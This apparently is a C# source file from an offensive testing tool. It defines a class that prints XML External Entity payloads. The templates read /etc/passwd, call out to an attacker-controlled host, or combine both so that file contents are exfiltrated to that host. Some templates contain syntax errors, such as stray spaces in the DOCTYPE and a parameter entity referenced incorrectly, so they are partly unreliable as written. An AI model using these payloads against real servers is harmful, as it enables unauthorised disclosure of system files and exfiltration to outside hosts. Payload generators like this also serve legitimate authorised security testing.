using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace CShidori.Core
{
    public class XxeTemplate
    {

        string target { get; set; }
        public XxeTemplate(string TemplateType)
        {
            this.target = Misc.GetIp();
            string XXE = string.Empty;


            if( TemplateType == "file")
            {
                 XXE = @"<?xml version=""1.0"" encoding=""UTF - 8""?>
< !DOCTYPE foo[
< !ELEMENT foo ANY >
<!ENTITY %xxe SYSTEM ""file:///etc/passwd"" >
]
>
<foo> &xxe;</foo>";

            }else if (TemplateType == "call"){

                XXE = @"<?xml version=""1.0"" encoding=""UTF - 8""?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY call SYSTEM ""§TARGET§/?xxe;"" >
]
>
<foo>&call;</foo> ";

            }
            else
            {
                XXE = @"<?xml version=""1.0"" encoding=""UTF - 8""?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY %xxe SYSTEM ""file:///etc/passwd"" >
<!ENTITY call SYSTEM ""§TARGET§/?%xxe;"" >
]
>
<foo>&call;</foo> ";
            }

            Console.WriteLine(XXE.Replace("§TARGET§", this.target));

        }
    }
}
